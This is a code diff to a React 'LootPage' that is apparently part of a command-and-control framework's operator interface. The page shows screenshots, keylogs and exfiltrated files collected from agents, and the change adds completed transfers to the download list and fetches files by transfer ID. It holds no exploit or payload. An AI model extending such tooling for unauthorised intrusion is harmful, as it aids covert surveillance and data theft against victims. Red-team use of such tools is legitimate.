@@ -71,7 +71,7 @@ export default function LootPage() {
     }
     return true;
   }), [data, agentFilter, keylogSearch]);
-  const filteredDownloads = useMemo(() => data?.download_tasks?.filter(d => !agentFilter || d.agent_id === agentFilter) || [], [data, agentFilter]);
+  const filteredDownloads = useMemo(() => [...(data?.download_tasks || []), ...(data?.completed_transfers || [])].filter(d => !agentFilter || d.agent_id === agentFilter), [data, agentFilter]);
 
   const visibleScreenshots = useMemo(() => {
     const totalPages = Math.max(1, Math.ceil(filteredScreenshots.length / SCREENSHOT_PAGE_SIZE));
@@ -98,7 +98,8 @@ export default function LootPage() {
     ...(data?.screenshots?.map(s => s.agent_id) || []),
     ...(data?.keylog_tasks?.map(k => k.agent_id) || []),
     ...(data?.download_tasks?.map(d => d.agent_id) || []),
-  ])], [data?.screenshots, data?.keylog_tasks, data?.download_tasks]);
+    ...(data?.completed_transfers?.map(d => d.agent_id) || []),
+  ])], [data?.screenshots, data?.keylog_tasks, data?.download_tasks, data?.completed_transfers]);
 
   const toggleSelect = useCallback((id: string) => {
     setSelectedItems(prev => {
@@ -163,12 +164,12 @@ export default function LootPage() {
 
   const downloadExfil = useCallback(async (d: DownloadTask) => {
     const filename = lootExfilFilename(d);
-    if (!filename || !d.agent_id) {
+    if (!filename || !d.agent_id || !d.transfer_id) {
       toast.error(t("loot.download_unavailable"));
       return;
     }
     try {
-      const { blob, filename: saved } = await api.downloadGet(paths.agents.filesExfilGet(d.agent_id, filename));
+      const { blob, filename: saved } = await api.downloadGet(paths.agents.transferFile(d.agent_id, d.transfer_id));
       downloadBlob(blob, saved || filename);
       toast.success(t("loot.toast.downloaded", { filename: saved || filename }));
     } catch (e) {
@@ -432,7 +433,7 @@ export default function LootPage() {
                       <TableCell className="font-mono text-xs text-muted-foreground max-w-[280px] truncate" title={d.command}>
                         {filename || d.command || "—"}
                       </TableCell>
-                      <TableCell className="font-mono text-xs text-muted-foreground">{formatBytes(lootExfilBytes(d.result))}</TableCell>
+                      <TableCell className="font-mono text-xs text-muted-foreground">{formatBytes(lootExfilBytes(d))}</TableCell>
                       <TableCell><StatusBadge status={d.status} /></TableCell>
                       <TableCell className="text-right">
                         {canDl ? (
